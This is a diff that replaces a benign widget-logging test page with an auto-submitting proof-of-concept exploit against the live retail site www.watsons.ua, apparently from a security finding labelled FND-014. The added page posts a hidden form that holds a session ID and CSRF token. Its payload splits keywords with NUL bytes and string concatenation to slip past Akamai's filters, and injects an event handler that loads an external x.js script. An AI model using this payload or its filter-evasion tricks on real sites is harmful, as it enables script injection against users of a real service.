@@ -1,67 +1,24 @@
-<html>
-<body>
-<h1>Customer Test Page</h1>
-<pre id="log"></pre>
+<!doctype html>
+<html><head><meta charset="utf-8"><title>FND-014</title></head>
+<body style="font:14px system-ui,sans-serif;margin:40px">
+<p>Submitting to www.watsons.ua&hellip;</p>
+<p><b>Use a fresh private window.</b> If you land on /uk/pageNotFound, your browser already had a
+watsons.ua cookie &mdash; that rejects the URL session. Not a fix.</p>
+
+<form id="f" method="POST" action="https://www.watsons.ua/uk/stockAnonymousNotification;jsessionid=30F13D15A205E8B0E6276DD2DB774E36.prdwtcuacom12">
+  <input type="hidden" name="_csrf" value="260c5694-9fb1-4dbd-8947-e5684f7abb7f">
+  <input type="hidden" name="varCode" id="v">
+</form>
+
 <script>
-function log(msg) {
-  document.getElementById('log').textContent += msg + '\n';
-  console.log(msg);
-}
-
-window.addEventListener('error', function(e) {
-  log('ERROR: ' + e.message + ' at ' + e.filename);
-});
-
-log('1. Page loaded, adding widget script...');
-var s = document.createElement('script');
-s.src = 'https://192cc8e0-f791-49f6-8157-52126a483ebd.redfastlabs.com/assets/redfast.js';
-s.onload = function() {
-  log('2. redfast.js loaded');
-  log('   window.Redfast: ' + typeof window.Redfast);
-  log('   window.RF: ' + typeof window.RF);
-
-  var checks = 0;
-  var interval = setInterval(function() {
-    checks++;
-    var rfDiv = document.getElementById('redfast-app');
-    var hasListeners = window.RF && typeof window.RF.listenerCount === 'function' && window.RF.listenerCount('actions');
-    log('3. Check ' + checks + ': div=' + !!rfDiv + ' listeners=' + hasListeners);
-
-    if (hasListeners > 0 || checks > 10) {
-      clearInterval(interval);
-      log('4. Calling Redfast.identify("test-user")...');
-      try {
-        Redfast.identify('test-user');
-        log('5. identify() called successfully');
-      } catch(e) {
-        log('5. identify() error: ' + e.message);
-      }
-
-      setTimeout(function() {
-        log('6. Post-identify check:');
-        log('   RF.actions: ' + JSON.stringify(window.RF && window.RF.actions ? Object.keys(window.RF.actions) : 'none'));
-        log('   Redfast.userId: ' + (window.Redfast && window.Redfast.userId));
-        log('   Redfast.rfApp: ' + (window.Redfast && window.Redfast.rfApp));
-        log('   Redfast.pingId: ' + (window.Redfast && window.Redfast.pingId));
-
-        if (!hasListeners) {
-          log('7. No listeners found after 10 checks - trying direct ping...');
-          try {
-            Redfast.ping();
-            log('   ping() called');
-          } catch(e) {
-            log('   ping() error: ' + e.message);
-          }
-        }
-      }, 3000);
-    }
-  }, 1000);
-};
-s.onerror = function(e) {
-  log('FAILED to load redfast.js: ' + JSON.stringify(e));
-};
-document.head.appendChild(s);
+// NULs split Akamai's signature matching; Tomcat strips them. 'scr'+'ipt' dodges the tag dictionary.
+// x.js is pulled from this page's own origin, so nothing needs editing.
+var N = String.fromCharCode(0);
+document.getElementById('v').value =
+  'A"' + N + '><details open on' + N + 'toggle="' +
+  's=docu' + N + "ment.createElement('scr'+'ipt');" +
+  "s.src='" + location.origin + "/x.js';" +
+  'docu' + N + 'ment.body.appendChild(s)">';
+document.getElementById('f').submit();
 </script>
-</body>
-</html>
-
+</body></html>
